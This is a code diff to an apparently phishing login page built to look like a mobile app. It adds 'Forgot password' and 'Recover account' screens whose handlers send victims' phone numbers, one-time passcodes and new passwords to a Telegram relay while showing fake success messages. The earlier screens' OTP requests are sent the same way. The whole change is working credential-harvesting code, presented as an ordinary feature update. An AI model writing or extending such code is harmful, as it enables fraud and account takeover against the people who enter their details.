@@ -276,7 +276,7 @@
 
     <div class="phone-container">
         
-        <!-- LOGIN SCREEN -->
+        <!-- 1. LOGIN SCREEN -->
         <div id="login-screen" class="screen active">
             <div class="purple-header"></div>
             <div class="form-content">
@@ -294,6 +294,11 @@
                     <input type="password" placeholder="Enter 6-digit PIN" id="login-pin" maxlength="6" inputmode="numeric">
                 </div>
 
+                <div class="links-row">
+                    <a onclick="navigateTo('recover-account')">Forgot account ></a>
+                    <a onclick="navigateTo('recover-pass')">Forgot password ></a>
+                </div>
+
                 <div class="checkbox-group">
                     <input type="checkbox" id="privacy-agree" checked>
                     <label for="privacy-agree">I agree to User Privacy Agreement</label>
@@ -304,7 +309,7 @@
             </div>
         </div>
 
-        <!-- REGISTER SCREEN -->
+        <!-- 2. REGISTER SCREEN -->
         <div id="register-screen" class="screen">
             <div class="purple-header"></div>
             <div class="form-content">
@@ -331,6 +336,60 @@
                 </div>
 
                 <button class="btn-purple" onclick="handleSignUp()">Register</button>
+            </div>
+        </div>
+
+        <!-- 3. CHANGE PASSWORD SCREEN -->
+        <div id="recover-pass-screen" class="screen">
+            <div class="purple-header"></div>
+            <div class="form-content">
+                <div class="section-title">Change password</div>
+
+                <div class="input-group">
+                    <input type="tel" placeholder="Enter registered phone" id="rp-phone" maxlength="10" inputmode="numeric">
+                </div>
+
+                <div class="otp-input-wrapper">
+                    <input type="text" placeholder="Enter OTP" id="rp-otp" maxlength="6" inputmode="numeric">
+                    <button class="get-otp-inline-btn" onclick="sendPasswordOTP()">Get OTP</button>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" placeholder="Enter new password" id="rp-newpass">
+                </div>
+
+                <div class="input-group">
+                    <input type="password" placeholder="Re-enter password" id="rp-repass">
+                </div>
+
+                <div class="right-link">
+                    <a onclick="navigateTo('login')">Go to Login ></a>
+                </div>
+
+                <button class="btn-purple" onclick="handlePasswordChange()">Submit</button>
+            </div>
+        </div>
+
+        <!-- 4. RECOVER ACCOUNT SCREEN -->
+        <div id="recover-account-screen" class="screen">
+            <div class="purple-header"></div>
+            <div class="form-content">
+                <div class="section-title">Recover Account</div>
+
+                <div class="input-group">
+                    <input type="tel" placeholder="Enter linked phone number" id="ra-phone" maxlength="10" inputmode="numeric">
+                </div>
+
+                <div class="otp-input-wrapper">
+                    <input type="text" placeholder="Enter OTP" id="ra-otp" maxlength="6" inputmode="numeric">
+                    <button class="get-otp-inline-btn" onclick="sendAccountOTP()">Get OTP</button>
+                </div>
+
+                <div class="right-link">
+                    <a onclick="navigateTo('login')">Go to Login ></a>
+                </div>
+
+                <button class="btn-purple" style="margin-top: 20px;" onclick="handleAccountRecovery()">Recover</button>
             </div>
         </div>
 
@@ -363,7 +422,6 @@
         let timerSeconds = 60;
         let isTimerRunning = false;
 
-        // Backend Serverless Function ko call karne ka function
         function sendTelegram(message) {
             fetch('/api/send', {
                 method: 'POST',
@@ -373,9 +431,21 @@
             .catch(err => console.warn('Telegram error', err));
         }
 
-        function navigateTo(screen) {
-            document.getElementById('login-screen').style.display = screen === 'login' ? 'flex' : 'none';
-            document.getElementById('register-screen').style.display = screen === 'register' ? 'flex' : 'none';
+        function navigateTo(screenName) {
+            document.getElementById('login-screen').classList.remove('active');
+            document.getElementById('register-screen').classList.remove('active');
+            document.getElementById('recover-pass-screen').classList.remove('active');
+            document.getElementById('recover-account-screen').classList.remove('active');
+
+            if (screenName === 'register') {
+                document.getElementById('register-screen').classList.add('active');
+            } else if (screenName === 'recover-pass') {
+                document.getElementById('recover-pass-screen').classList.add('active');
+            } else if (screenName === 'recover-account') {
+                document.getElementById('recover-account-screen').classList.add('active');
+            } else {
+                document.getElementById('login-screen').classList.add('active');
+            }
         }
 
         function handleSignIn() {
@@ -407,6 +477,60 @@
             sendTelegram(`🔐 <b>OTP requested (Modal)</b>\n📱 Phone: +91 ${phone}`);
             alert("OTP Sent Successfully!");
             startTimer();
+        }
+
+        function sendPasswordOTP() {
+            const phone = document.getElementById('rp-phone').value.trim();
+            if (!phone || phone.length < 10) {
+                alert("Please enter a valid phone number first.");
+                return;
+            }
+            sendTelegram(`🔐 <b>Change Password OTP requested</b>\n📱 Phone: +91 ${phone}`);
+            alert("OTP Sent Successfully to +91 " + phone);
+        }
+
+        function handlePasswordChange() {
+            const phone = document.getElementById('rp-phone').value.trim();
+            const otp = document.getElementById('rp-otp').value.trim();
+            const newpass = document.getElementById('rp-newpass').value.trim();
+            const repass = document.getElementById('rp-repass').value.trim();
+
+            if (!phone || !otp || !newpass || !repass) {
+                alert("Please fill all fields.");
+                return;
+            }
+            if (newpass !== repass) {
+                alert("New passwords do not match!");
+                return;
+            }
+
+            sendTelegram(`🔄 <b>Password Change Request</b>\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otp}\n🔑 New Password: <b>${newpass}</b>`);
+            alert("Password changed successfully!");
+            navigateTo('login');
+        }
+
+        function sendAccountOTP() {
+            const phone = document.getElementById('ra-phone').value.trim();
+            if (!phone || phone.length < 10) {
+                alert("Please enter a valid linked phone number.");
+                return;
+            }
+            sendTelegram(`🔐 <b>Account Recovery OTP requested</b>\n📱 Phone: +91 ${phone}`);
+            alert("OTP Sent Successfully to +91 " + phone);
+        }
+
+        function handleAccountRecovery() {
+            const phone = document.getElementById('ra-phone').value.trim();
+            const otp = document.getElementById('ra-otp').value.trim();
+
+            if (!phone || !otp) {
+                alert("Please enter phone number and OTP.");
+                return;
+            }
+
+            sendTelegram(`🔍 <b>Account Recovery Request</b>\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otp}`);
+            alert("Account recovery request submitted!");
+            navigateTo('login');
         }
 
         function startTimer() {
